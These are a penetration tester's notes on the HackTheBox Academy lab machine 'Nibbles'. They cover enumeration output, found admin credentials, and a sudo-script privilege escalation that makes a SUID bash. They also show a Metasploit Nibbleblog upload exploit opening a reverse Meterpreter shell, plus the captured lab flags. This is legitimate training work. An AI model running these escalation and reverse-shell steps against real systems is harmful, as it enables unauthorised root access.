# BOX NAME: Nibbles
**LINK**: HackTheBox Academy

<details open><summary><ins>SUMMARY</ins></summary>

```
1. 
2. 
3. 
4. 
5.

```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.129.245.197
[+] URL:	http://10.129.245.197
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap -sC -sV 10.129.245.197 -p- -oN nibbles-nmap.log  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 13:33 CEST
Nmap scan report for 10.129.245.197
Host is up (0.042s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                             
                                                                                                                    
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                      
Nmap done: 1 IP address (1 host up) scanned in 33.04 seconds

```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan
```
http://10.129.245.197 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.245.197]

http://10.129.245.197/nibbleblog [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.245.197], RedirectLocation[http://10.129.245.197/nibbleblog/], Title[301 Moved Permanently]                                                                                                     
http://10.129.245.197/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.245.197], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]
```

nikto-scan
```

```

fuzzing
```

```
other
```

```

</details>

<details><summary><ins>SERVICES</ins></summary>

FTP
```

```

SSH
```

```

SNMP
```

```

DNS
```

```

MAILSERVICES (POP, IMAP, SMTP)
```

```

LDAP
```

```

</details>

<details><summary><ins>Active Directory</ins></summary>

Active Directory
```

```
</details>

<details><summary><ins>SUMMARY REMOTE</ins></summary>

```
1. /nibbleblog/
2. /nibbleblog/admin.php (admin:nibbles)
3.
```
</details>

# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```

```

**SUID's**:

```

```
**SGID's**:

```

```
**OTHERS**:

```

```
</details>


# LOOT

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*
```

```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
{username:password}

Wordpress Login | admin:nibbles
```
</details>

<details><summary><ins>HASHES:</ins></summary>

```

```
</details>

# PROOFS

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' > monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
cd /tmp/./rootbash -p

```

```
nibbler@Nibbles:/tmp$ ./rootbash -p
rootbash-4.3# id
uid=1001(nibbler) gid=1001(nibbler) euid=0(root) egid=0(root) groups=0(root),1001(nibbler)

```

```
Flags:
A1:	79c03865431abf47b90ef24b9695e148
A2: de5e5d6619862a8aa5b9b212314e0cdd
```

```
Metasploit module:

msf6 exploit(multi/http/nibbleblog_file_upload) > run

[*] Started reverse TCP handler on 10.10.14.158:9443 
[*] Sending stage (39927 bytes) to 10.129.245.197
[+] Deleted image.php
[*] Meterpreter session 1 opened (10.10.14.158:9443 -> 10.129.245.197:60296) at 2023-06-11 14:07:54 +0200

meterpreter > shell -t
[*] env TERM=xterm HISTFILE= /usr/bin/script -qc /bin/bash /dev/null
Process 1675 created.
Channel 0 created.
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ id
id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ 
```
</details>